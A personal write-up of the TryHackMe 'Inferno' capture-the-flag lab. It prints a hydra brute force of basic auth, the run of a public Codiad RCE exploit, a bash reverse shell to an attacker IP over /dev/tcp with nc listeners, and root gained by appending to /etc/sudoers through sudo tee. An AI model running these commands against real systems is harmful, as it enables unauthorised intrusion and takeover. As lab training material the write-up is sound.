<h1 align="center">Inferno</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/ae5e1017-6cd9-410b-bfc1-562581350474"><br>
2025, September 5<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>487</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Real Life machine + CTF. The machine is designed to be real-life (maybe not?) and is perfect for newbies starting out in penetration testing</em>.<br>
Access it <a href="https://tryhackme.com/room/inferno">here</a><br>
<img width="1200px" src="https://github.com/user-attachments/assets/7cfb95e3-a4e6-4d27-942a-d3b10286e219"></p>


<h1>Task 1 . Inferno</h1>

<p>﻿"Midway upon the journey of our life I found myself within a forest dark, For the straightforward pathway had been lost. Ah me! how hard a thing it is to say What was this forest savage, rough, and stern, Which in the very thought renews the fear."<br>

There are 2 hash keys located on the machine (user - local.txt and root - proof.txt), can you find them and become root?<br>

Remember: in the nine circles of Hell you will find some demons that will try to prevent your access, ignore them and move on. (if you can)</p>

<p><em>Answer the questions below</em></p>

<h2>nmap</h2>

```bash
:~# nmap -sT xx.xxx.xxx.xx
...
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
23/tcp    open  telnet
25/tcp    open  smtp
80/tcp    open  http
88/tcp    open  kerberos-sec
106/tcp   open  pop3pw
110/tcp   open  pop3
389/tcp   open  ldap
443/tcp   open  https
464/tcp   open  kpasswd5
636/tcp   open  ldapssl
777/tcp   open  multiling-http
783/tcp   open  spamassassin
808/tcp   open  ccproxy-http
873/tcp   open  rsync
1001/tcp  open  webpush
1236/tcp  open  bvcontrol
1300/tcp  open  h323hostcallsc
2000/tcp  open  cisco-sccp
2003/tcp  open  finger
2121/tcp  open  ccproxy-ftp
2601/tcp  open  zebra
2602/tcp  open  ripd
2604/tcp  open  ospfd
2605/tcp  open  bgpd
2607/tcp  open  connection
2608/tcp  open  wag-service
4224/tcp  open  xtell
5051/tcp  open  ida-agent
5432/tcp  open  postgresql
5555/tcp  open  freeciv
5666/tcp  open  nrpe
6346/tcp  open  gnutella
6566/tcp  open  sane-port
6667/tcp  open  irc
8021/tcp  open  ftp-proxy
8081/tcp  open  blackice-icecap
8088/tcp  open  radan-http
9418/tcp  open  git
10000/tcp open  snet-sensor-mgmt
10082/tcp open  amandaidx
```

<h2>gobuster</h2>

```bash
:~# gobuster dir -u http://xx.xxx.xxx.xx/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
...
/inferno              (Status: 401) [Size: 460]
/server-status        (Status: 403) [Size: 278]
```

<h2>FTP</h2>

<p>

- did not work</p>

<h2>/inferno</h2>

<p>

- <code>User Name</code> and <code>Password</code> needed</p>

<h2>hydra</h2>
<p>

- tried admin after other usernames such as administrator and inferno</p>

```bash
:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://xx.xxx.xxx.xx/inferno/ -t 60
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
...
[80][http-get] host: xx.xxx.xxx.xx   login: admin   password: dante1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-05 xx:xx:xx
```

<h2>/inferno</h2>

<p>

- logged in<br>
- logged in again</p>
- identified <code>Codiad</code><p>

<img width="1091" height="413" alt="image" src="https://github.com/user-attachments/assets/aba0294c-08ff-44c3-8650-af4ea3a0616c" />

```bash
/ PATH TO CODIAD
define("BASE_PATH", "/var/www/html/inferno");

// BASE URL TO CODIAD (without trailing slash)
define("BASE_URL", "xxx.xxx.x.xxx/inferno");

// THEME : default, modern or clear (look at /themes)
define("THEME", "default");

// ABSOLUTE PATH
define("WHITEPATHS", BASE_PATH . ",/home");

// PATHS
define("COMPONENTS", BASE_PATH . "/components");
define("PLUGINS", BASE_PATH . "/plugins");
define("THEMES", BASE_PATH . "/themes");
define("DATA", BASE_PATH . "/data");
define("WORKSPACE", BASE_PATH . "/workspace");
```

<h2>CVE-2018-14009, Codiad 2.8.4 - Remote Code Execution (Authenticated)</h2>

```bash
:~# searchsploit codiad
-------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                          |  Path
-------------------------------------------------------------------------------------------------------- ---------------------------------
Codiad 2.4.3 - Multiple Vulnerabilities                                                                 | php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion                                                                     | php/webapps/36371.txt
Codiad 2.8.4 - Remote Code Execution (Authenticated)                                                    | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)                                                | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)                                                | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)                                                | multiple/webapps/50474.txt
-------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```bash
:~# searchsploit -m multiple/webapps/49705.py
  Exploit: Codiad 2.8.4 - Remote Code Execution (Authenticated)
      URL: https://www.exploit-db.com/exploits/49705
     Path: /opt/exploitdb/exploits/multiple/webapps/49705.py
    Codes: CVE-2018-14009
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /root/49705.py
```

```bash
:~# python3 49705.py http://admin:dante1@xx.xxx.xxx.xx/inferno/ admin dante1 xx.xxx.xx.xxx 4444 linux
```

```bash
:~# echo 'bash -c "bash -i >/dev/tcp/xx.xxx.xx.xxx/4445 0>&1 2>&1"' | nc -lnvp 4444
Listening on 0.0.0.0 4444
```

```bash
:~# nc -lvnp 4445
Listening on 0.0.0.0 4445
```

```bash
:~# python3 49705.py http://admin:dante1@xx.xxx.xxx.xx/inferno/ admin dante1 xx.xxx.xx.xxx 4444 linux
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/xx.xxx.xx.xxx/4445 0>&1 2>&1"' | nc -lnvp 4444
nc -lnvp 4445
[+] Please confirm that you have done the two command above [y/n]
[Y/n] Y
[+] Starting...
[+] Login Content : {"status":"success","data":{"username":"admin"}}
[+] Login success!
[+] Getting writeable path...
[+] Path Content : {"status":"success","data":{"name":"inferno","path":"\/var\/www\/html\/inferno"}}
[+] Writeable Path : /var/www/html/inferno
[+] Sending payload...
```

```bash
:~# echo 'bash -c "bash -i >/dev/tcp/xx.xxx.xx.xxx/4445 0>&1 2>&1"' | nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on xx.xxx.xx.xx 46644
```

<h2>www-data</h2>

```bash
:~# nc -lvnp 4445
Listening on 0.0.0.0 4445
Connection received on xx.xxx.xxx.xx 55216
bash: cannot set terminal process group (859): Inappropriate ioctl for device
bash: no job control in this shell
www-data@...:/var/www/html/inferno/components/filemanager$
```

```bash
www-data@...:/var/www/html/inferno/components/filemanager$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
```

```bash
ww-data@...:/home/dante$ ls
ls
Desktop    Downloads  Pictures	Templates  local.txt
Documents  Music      Public	Videos
```

```bash
www-data@...:/home/dante$ cat local.txt
cat local.txt
cat: local.txt: Permission denied
```

```bash
www-data@...:/home/dante/Downloads$ ls -lah
ls -lah
total 4.4M
drwxr-xr-x  2 root  root  4.0K Jan 11  2021 .
drwxr-xr-x 13 dante dante 4.0K Jan 11  2021 ..
-rw-r--r--  1 root  root  1.5K Nov  3  2020 .download.dat
-rwxr-xr-x  1 root  root  135K Jan 11  2021 CantoI.docx
-rwxr-xr-x  1 root  root  139K Jan 11  2021 CantoII.docx
-rwxr-xr-x  1 root  root   87K Jan 11  2021 CantoIII.docx
-rwxr-xr-x  1 root  root   63K Jan 11  2021 CantoIV.docx
-rwxr-xr-x  1 root  root  131K Jan 11  2021 CantoIX.docx
-rwxr-xr-x  1 root  root   43K Jan 11  2021 CantoV.docx
-rwxr-xr-x  1 root  root  131K Jan 11  2021 CantoVI.docx
-rwxr-xr-x  1 root  root  139K Jan 11  2021 CantoVII.docx
-rwxr-xr-x  1 root  root   63K Jan 11  2021 CantoX.docx
-rwxr-xr-x  1 root  root  119K Jan 11  2021 CantoXI.docx
-rwxr-xr-x  1 root  root  146K Jan 11  2021 CantoXII.docx
-rwxr-xr-x  1 root  root  212K Jan 11  2021 CantoXIII.docx
-rwxr-xr-x  1 root  root  139K Jan 11  2021 CantoXIV.docx
-rwxr-xr-x  1 root  root  139K Jan 11  2021 CantoXIX.docx
-rwxr-xr-x  1 root  root   87K Jan 11  2021 CantoXV.docx
-rwxr-xr-x  1 root  root  135K Jan 11  2021 CantoXVI.docx
-rwxr-xr-x  1 root  root  119K Jan 11  2021 CantoXVII.docx
-rwxr-xr-x  1 root  root  2.3M Jan 11  2021 CantoXVIII.docx
-rwxr-xr-x  1 root  root   63K Jan 11  2021 CantoXX.docx
```

```bash
www-data@Inferno:/home/dante/Downloads$ cat .download.dat
cat .download.dat
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 66 61 20 74 72 65 6d 61 72 20 6c 65 20 76 65 6e 65 20 65 20 69 20 70 6f 6c 73 69 c2 bb 2e 0a 0a 64 61 6e 74 65 3a 56 31 72 67 31 6c 31 30 68 33 6c 70 6d 33 0a
```

<h2>CyberChef</h2>

<img width="1356" height="420" alt="image" src="https://github.com/user-attachments/assets/24460a02-ebeb-49bc-8ac6-800b541ba2e8" />


```bash
«Or se’ tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,
rispuos’io lui con vergognosa fronte.

«O de li altri poeti onore e lume,
vagliami ’l lungo studio e ’l grande amore
che m’ha fatto cercar lo tuo volume.

Tu se’ lo mio maestro e ’l mio autore,
tu se’ solo colui da cu’ io tolsi
lo bello stilo che m’ha fatto onore.

Vedi la bestia per cu’ io mi volsi;
aiutami da lei, famoso saggio,
ch’ella mi fa tremar le vene e i polsi».

dante:**************
```

<h2>dante</h2>

```bash
:~# ssh dante@xx.xxx.xxx.xx
```

```bash
dante@...:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

```bash
dante@...:~$ export TERM=xterm
```

```bash
dante@...:~$ ls
Desktop  Documents  Downloads  local.txt  Music  Pictures  Public  Templates  Videos
```

```bash
dante@Inferno:~$ cat local.txt
********************************
```

<br>
<p>1.1. Locate and find local.txt<br>
<code>********************************</code></p>


```bash
dante@...:~$ sudo -l
Matching Defaults entries for dante on ...:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on ...:
    (root) NOPASSWD: /usr/bin/tee
```

<p>

- https://gtfobins.github.io/gtfobins/tee/?ref=g10s.io#sudo</p>

<img width="1328" height="334" alt="image" src="https://github.com/user-attachments/assets/9bb56027-c207-4f28-8b1d-b3c6e6589e71" />

<br>

```bash
dante@...:~$ ls -lah
total 72K
drwxr-xr-x 13 dante dante 4.0K Jan 11  2021 .
drwxr-xr-x  4 root  root  4.0K Sep  5 22:17 ..
lrwxrwxrwx  1 root  root     9 Jan 11  2021 .bash_history -> /dev/null
-rw-r--r--  1 dante dante  220 Apr  4  2018 .bash_logout
-rw-r--r--  1 dante dante 3.7K Apr  4  2018 .bashrc
drwx------  2 dante dante 4.0K Jan 11  2021 .cache
drwxr-x---  3 dante dante 4.0K Jan 11  2021 .config
drwxr-xr-x  2 root  root  4.0K Jan 11  2021 Desktop
drwxr-xr-x  2 root  root  4.0K Jan 11  2021 Documents
drwxr-xr-x  2 root  root  4.0K Jan 11  2021 Downloads
drwx------  4 dante dante 4.0K Jan 11  2021 .gnupg
-rw-------  1 dante dante   33 Jan 11  2021 local.txt
drwxr-xr-x  2 root  root  4.0K Jan 11  2021 Music
drwxr-xr-x  2 root  root  4.0K Jan 11  2021 Pictures
-rw-r--r--  1 dante dante  807 Apr  4  2018 .profile
drwxr-xr-x  2 root  root  4.0K Jan 11  2021 Public
-rw-r--r--  1 dante dante    0 Jan 11  2021 .sudo_as_admin_successful
drwxr-xr-x  2 root  root  4.0K Jan 11  2021 Templates
drwxr-xr-x  2 root  root  4.0K Jan 11  2021 Videos
-rw-------  1 dante dante  106 Jan 11  2021 .Xauthority
```

```bash
dante@...:~$ sudo /usr/bin/tee -a "/etc/shadow"
```

```bash
dante@...:~$ echo "dante    ALL=(ALL:ALL) ALL" | sudo tee -a "/etc/sudoers"
dante    ALL=(ALL:ALL) ALL
```

```bash
dante@...:~$ sudo -s
[sudo] password for dante: 
```

<h2>root</h2>

```bash
root@...:/home/dante# cd /root
root...:~# ls
proof.txt  snap
```

```bash
root@...:/home/dante# cat /root/proof.txt
Congrats!

You've rooted Inferno!

********************************

mindsflee
```

<br>
<p>1.2. Locate and find proof.txt<br>
<code>********************************</code></p>

<br>
<h2 align="center">Completed</h2>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/c24e782e-eca1-4d31-86c4-b3a8f58e1498"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/282b212b-296b-4546-9d20-cb5f87961a4b"></p>

<h2 align="center">My TryHackMe Journey</h2>

<div align="center">

| Date              | Room                  |Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :--------------- | :-------------------  |  :------:|:----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |                       |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, Sep 5       |Medium 🚩 - <code>Inferno</code> | 487      |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ   |    12ⁿᵈ    | 124,236  |    943    |    73     |
| 2025, Sep 5       |Easy 🔗 - Psycho Break | 487      |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ   |    10ᵗʰ    | 124,152  |    942    |    73     |
| 2025, Sep 4       |Medium 🔗 - IP and Domain Threat Intel|486|	113ʳᵈ|	5ᵗʰ	|579ᵗʰ|	10ᵗʰ|	124,018|	940	|73|
| 2025, Sep 4       |Medium 🚩 - Cold VVars | 486      |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ   |    10ᵗʰ    | 124,048  |    941    |    73     |
| 2025, Sep 3       |Easy 🔗 - Malware Classification | 485     |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ   |    13ʳᵈ    | 123,882  |    939   |    73     |
| 2025, Sep 2       |Medium 🔗 - Session Forencics | 484     |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ   |    14ᵗʰ    | 123,786  |    938   |    73     |
| 2025, Sep 1       |Medium 🚩 - Voyage | 483     |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ   |    15ᵗʰ    | 123,636  |    937   |    73     |

</div>

<p align="center">Global All Time:   113ʳᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/02fec03a-baf9-4eb6-a85a-b611e9e06513"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/2802507e-e1bf-439a-b601-d29b87d3e62d"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/df85d74e-b301-49d2-a874-17701b834eeb"><br>
                  Global monthly:    758ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/f923653a-e9ff-417c-b41e-afc328d8fe17"><br>
                  Brazil monthly:     12ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/73cffb61-33a8-44ed-9c04-7fd7de225644"><br>

<h2 align="center">Thanks for coming!</h2>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>


<img width="1904" height="901" alt="image" src="https://github.com/user-attachments/assets/c24e782e-eca1-4d31-86c4-b3a8f58e1498" />

<img width="1874" height="886" alt="image" src="https://github.com/user-attachments/assets/0387c8f4-2c87-49f5-a53e-dfc875f836c9" />

<img width="1872" height="899" alt="image" src="https://github.com/user-attachments/assets/282b212b-296b-4546-9d20-cb5f87961a4b" />





